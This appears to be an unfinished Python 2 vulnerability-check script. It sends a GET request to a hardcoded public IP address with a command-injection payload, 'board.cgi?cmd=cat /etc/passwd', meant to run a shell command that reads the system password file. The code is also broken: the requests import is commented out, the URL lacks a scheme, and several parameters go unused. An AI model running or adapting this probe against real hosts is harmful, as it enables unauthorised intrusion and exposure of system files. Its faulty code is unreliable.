# !/usr/bin/env python
# -*- coding:utf-8 -*-


# import requests


def check_vul(**data):
    useragent = ''
    print data
    print data.keys()
    if 'url' in data.keys() and 'hostname' in data.keys():
        httpurl = data['hostname'] + data['url']
    else:
        return 'no hostname or url'
    if 'method' in data.keys():
        if data['method'].lower() == 'get':
            # get 方式进行验证
            content = requests.get(httpurl, headers=headers)
            print content

    pass


if __name__ == '__main__':
    header = headers = {'user-agent': 'my-app/0.0.1'}
    url = '/board.cgi?cmd=cat%20/etc/passwd'
    hostname = '114.113.67.49'
    port = ''
    postdata = ''
    method = 'GET'
    check_vul(url = url, hostname = hostname, port = port, postdata = postdata, header = header, method = method )